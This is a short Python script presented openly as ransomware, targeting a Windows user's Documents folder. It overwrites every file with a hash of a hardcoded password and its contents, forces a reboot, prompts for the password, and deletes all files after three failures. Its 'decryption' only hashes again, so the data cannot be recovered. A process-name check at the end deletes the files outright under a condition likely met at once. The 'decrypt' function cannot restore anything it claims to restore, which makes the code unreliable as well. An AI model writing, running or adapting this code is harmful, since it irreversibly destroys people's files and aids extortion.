import os
import psutil
import sys
import hashlib

password = '%2Jg@m#sg#@&p@nt@!$%'
max_tries = 3

def decrypt_file(filename, key):
    with open(filename, 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = hashlib.sha256(key.encode() + encrypted_data).hexdigest().encode()
    with open(filename, 'wb') as f:
        f.write(decrypted_data)

def decrypt_files(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

def encrypt_file(filename, key):
    with open(filename, 'rb') as f:
        data = f.read()
    encrypted_data = hashlib.sha256(key.encode() + data).hexdigest().encode()
    with open(filename, 'wb') as f:
        f.write(encrypted_data)

def encrypt_files(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def delete_files(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            os.remove(file_path)

def check_process(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return True
    return False

def ransomware():
    encrypt_files('C:\\Users\\<username>\\Documents', password)
    os.system('shutdown /r /t 0')
    for i in range(max_tries):
        user_input = input('Enter password: ')
        if user_input == password:
          decrypt_files('C:\\Users\\<username>\\Documents', '')
          sys.exit(0)

        else:
            print('Incorrect password. Attempts remaining: ', max_tries-i-1)
    delete_files('C:\\Users\\<username>\\Documents')

while True:
    if not check_process('ransomeware.py'):
        delete_files('C:\\Users\\<username>\\Documents')
        break
